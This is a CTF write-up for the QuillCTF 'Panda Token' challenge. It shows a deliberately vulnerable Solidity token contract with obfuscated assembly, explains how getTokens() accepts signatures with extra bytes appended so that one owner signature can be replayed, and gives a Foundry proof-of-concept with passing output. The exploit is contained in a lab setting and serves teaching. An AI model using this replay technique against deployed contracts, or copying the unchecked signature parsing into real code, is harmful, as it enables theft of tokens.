# QuillCTF : Panda Token

## Objective of CTF

To pass the CTF, the hacker must have 3 tokens (3e18) on their account.

### Contract code
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8;
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

contract PandaToken is ERC20, Ownable {
    uint public c1;
    mapping(bytes => bool) public usedSignatures;
    mapping(address => uint) public burnPending;
    event show_uint(uint u);

    function sMint(uint amount) external onlyOwner {
        _mint(msg.sender, amount);
    }

    constructor(
        uint _c1,
        string memory tokenName,
        string memory tokenSymbol
    ) ERC20(tokenName, tokenSymbol) {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, sload(mul(1, 110)))
            mstore(add(ptr, 0x20), 0)
            let slot := keccak256(ptr, 0x40)
            sstore(slot, exp(10, add(4, mul(3, 5))))
            mstore(ptr, sload(5))
            sstore(6, _c1)
            mstore(add(ptr, 0x20), 0)
            let slot1 := keccak256(ptr, 0x40)
            mstore(ptr, sload(7))
            mstore(add(ptr, 0x20), 0)
            sstore(slot1, mul(sload(slot), 2))
        }
    }

    function calculateAmount(
        uint I1ILLI1L1ILLIL1LLI1IL1IL1IL1L
    ) public view returns (uint) {
        uint I1I1LI111IL1IL1LLI1IL1IL11L1L;
        assembly {
            let I1ILLI1L1IL1IL1LLI1IL1IL11L1L := 2
            let I1ILLILL1IL1IL1LLI1IL1IL11L1L := 1000
            let I1ILLI1L1IL1IL1LLI1IL1IL11L11 := 14382
            let I1ILLI1L1IL1ILLLLI1IL1IL11L1L := 14382
            let I1LLLI1L1IL1IL1LLI1IL1IL11L1L := 599
            let I1ILLI111IL1IL1LLI1IL1IL11L1L := 1
            I1I1LI111IL1IL1LLI1IL1IL11L1L := div(
                mul(
                    I1ILLI1L1ILLIL1LLI1IL1IL1IL1L,
                    I1ILLILL1IL1IL1LLI1IL1IL11L1L
                ),
                add(
                    I1LLLI1L1IL1IL1LLI1IL1IL11L1L,
                    add(I1ILLI111IL1IL1LLI1IL1IL11L1L, sload(6))
                )
            )
        }

        return I1I1LI111IL1IL1LLI1IL1IL11L1L;
    }

    function getTokens(uint amount, bytes memory signature) external {
        uint giftAmount = calculateAmount(amount);

        bytes32 msgHash = keccak256(abi.encode(msg.sender, giftAmount));
        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }

        address giftFrom = ecrecover(msgHash, v, r, s);
        burnPending[giftFrom] += amount;
        require(amount == 1 ether, "amount error");
        require(
            (balanceOf(giftFrom) - burnPending[giftFrom]) >= amount,
            "balance"
        );
        require(!usedSignatures[signature], "used signature");
        usedSignatures[signature] = true;
        _mint(msg.sender, amount);
    }

    function burnPendings(address burnFrom) external onlyOwner {
        burnPending[burnFrom] = 0;
        _burn(burnFrom, burnPending[burnFrom]);
    }
}
```

### Foundry setup
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/PandaToken.sol";

contract Hack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution
        ...
       

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}
```

According to the given foundry setup, the owner has signed to hash to let us mint 1 ether of token with `getTokens()`, the goal is to mint 3 ether of token, however after `getTokens()` is called, the `usedSignatures` mapping of the signature used will be set to true, so it can't be reused

Looking at `getTokens()`, it will calculate `giftAmount` by passing the amount we gave it to `calculateAmount()`, and `calculateAmount()` is a confusing function

We can first rename the confusing variables :
```solidity
    function calculateAmount(
        uint a
    ) public view returns (uint) {
        uint b;
        assembly {
            let c := 2
            let d := 1000
            let e := 14382
            let f := 14382
            let g := 599
            let h := 1
            b := div(
                mul(
                    a,
                    d
                ),
                add(
                    g,
                    add(h, sload(6))
                )
            )
        }

        return b;
    }
```

`c`, `e`, `f` are not used at all, and what it's doing is `(a * d)/(g + (h + sload(6)))`

`sload(6)` is the storage slot 6, which contains the `c1` state variable, which is set to 400 on the constructor, so `(g + (h + sload(6)))` is 1000, and what it does is `a * 1000 / 1000`, which is `a` itself, the function does nothing to the argument amount passed into it, unless the `c1` state variable changes

Then it just calculate the `msgHash` and get the v, r, s from the `signature` in memory, and recover the `giftFrom` address, which should be the signer of the message

It requires that the amount must be 1 ether, so in order to get to 3 ether, we have to at least call `getTokens()` for 3 times, and it requires the `giftFrom` balance - burnPending[giftFrom] need to be greater than or equal to amount, otherwise revert

By looking at the code, it looks like the owner doesn't have any token at all, but actually the owner set his token in the constructor using inline assembly
```
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, sload(mul(1, 110)))
            mstore(add(ptr, 0x20), 0)
            let slot := keccak256(ptr, 0x40)
            sstore(slot, exp(10, add(4, mul(3, 5))))
            mstore(ptr, sload(5))
            sstore(6, _c1)
            mstore(add(ptr, 0x20), 0)
            let slot1 := keccak256(ptr, 0x40)
            mstore(ptr, sload(7))
            mstore(add(ptr, 0x20), 0)
            sstore(slot1, mul(sload(slot), 2))
        }
```

Basically what its doing is setting the slot 6 (`c1`) to `_c1` and getting the slot for the owner balance and setting it to `mul(exp(10, add(4, mul(3, 5))), 2)`, which is `20000000000000000000` (20 ether)

So, as the owner has enough balance `getTokens()` won't revert, and it will set the `usedSignatures` mapping of the signature used to true, so it can't be used

So, the problem is the `signature` argument is bytes which has dynamic size, and it uses inline assembly to retrieve r, s and v from the bytes `signature`
```
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
```
It gets `r` by loading the memory offset of signature and adding 0x20, as the first 32 bytes will be the length of it, and next 32 bytes after `r` is `s`, and the first byte of the next 32 bytes after `s` is `v`, and it ignores whatever after `v`

The `getTokens()` function will not check the length of `signature` even it has dynamic size, so we can append any bytes after r,s,v and the `getTokens()` function will retrieve the same r, s, v values from `signature`

So after the signature provided by the owner has been used, we can still create 2 more different signatures which `getTokens()` will retrieve the same r, s, v value, so we can mint 3 ether of token in total

## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/PandaToken.sol";

contract Hack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution
        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v));
        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v, bytes1(hex"00")));
        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v, bytes1(hex"01")));

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}
```

### Foundry test output

```
# forge test -vv
[⠊] Compiling...
[⠘] Compiling 14 files with 0.8.7
[⠆] Solc 0.8.7 finished in 4.68s
Compiler run successful

Running 1 test for test/panda-token.t.sol:Hack
[PASS] test() (gas: 177760)
Test result: ok. 1 passed; 0 failed; finished in 2.67ms
```